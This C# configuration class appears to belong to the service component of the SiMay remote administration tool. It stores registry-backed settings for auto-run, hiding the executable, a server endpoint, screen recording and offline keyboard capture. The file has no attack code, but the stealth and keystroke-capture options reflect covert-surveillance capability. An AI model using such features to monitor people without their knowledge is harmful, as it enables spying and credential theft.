using SiMay.Core;
using SiMay.Core.AppConfig;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;

namespace SiMay.ServiceCore
{
    public class ServiceAppConfig : AbstractAppConfigBase
    {
        public override string GetConfig(string key)
        {
            if (!AppConfig.ContainsKey(key))
                AppConfig[key] = AppConfigRegValueHelper.GetValue(key);

            string val;
            if (AppConfig.TryGetValue(key, out val))
                return val;
            else
                return null;
        }

        public override bool SetConfig(string key, string value)
        {
            bool successed = AppConfigRegValueHelper.SetValue(key, value);
            if (successed)
                AppConfig[key] = value;

            return successed;
        }
    }
    /// <summary>
    /// 系统全局配置
    /// </summary>
    public class AppConfiguartion
    {

        public static AbstractAppConfigBase SysConfigs { get; } = new ServiceAppConfig();

        public static bool IsAutoRun { get; set; }
        public static bool IsHideExcutingFile { get; set; }
        public static string DefaultRemarkInfo { get; set; }
        public static string DefaultGroupName { get; set; }
        public static string Version { get; set; }
        public static long AccessKey { get; set; }
        public static string RunTime { get; set; }
        /// <summary>
        /// 连接的服务端是否中间服务器
        /// </summary>
        public static bool IsCentreServiceMode { get; set; } = false;
        public static string IdentifyId { get; set; }

        public static IPEndPoint ServerIPEndPoint { get; set; }
        public static string HostAddress { get; set; }
        public static int HostPort { get; set; }

        public static string GroupName
        {
            get
            {
                var groupName = SysConfigs.GetConfig("GroupName");
                return groupName == "" ? null : groupName;
            }
            set
            {
                SysConfigs.SetConfig("GroupName", value);
            }
        }

        public static string RemarkInfomation
        {
            get
            {
                var remark = SysConfigs.GetConfig("RemarkInfomation");
                return remark;
            }
            set
            {
                SysConfigs.SetConfig("RemarkInfomation", value);
            }
        }

        public static string IsOpenScreenView
        {
            get
            {
                return SysConfigs.GetConfig("isOpenScreenView");
            }
            set
            {
                SysConfigs.SetConfig("isOpenScreenView", value);
            }
        }

        public static string IsScreenRecord
        {
            get
            {
                return SysConfigs.GetConfig("IsScreenRecord");
            }
            set
            {
                SysConfigs.SetConfig("IsScreenRecord", value);
            }
        }

        public static string ScreenRecordHeight
        {
            get
            {
                return SysConfigs.GetConfig("ScreenRecordHeight");
            }
            set
            {
                SysConfigs.SetConfig("ScreenRecordHeight", value);
            }
        }
        public static string ScreenRecordWidth
        {
            get
            {
                return SysConfigs.GetConfig("ScreenRecordWidth");
            }
            set
            {
                SysConfigs.SetConfig("ScreenRecordWidth", value);
            }
        }
        public static string ScreenRecordSpanTime
        {
            get
            {
                return SysConfigs.GetConfig("ScreenRecordSpanTime");
            }
            set
            {
                SysConfigs.SetConfig("ScreenRecordSpanTime", value);
            }
        }


        public static string KeyboardOffline
        {
            get
            {
                return SysConfigs.GetConfig("Offlinekeyboard");
            }
            set
            {
                SysConfigs.SetConfig("Offlinekeyboard", value);
            }
        }
    }
}
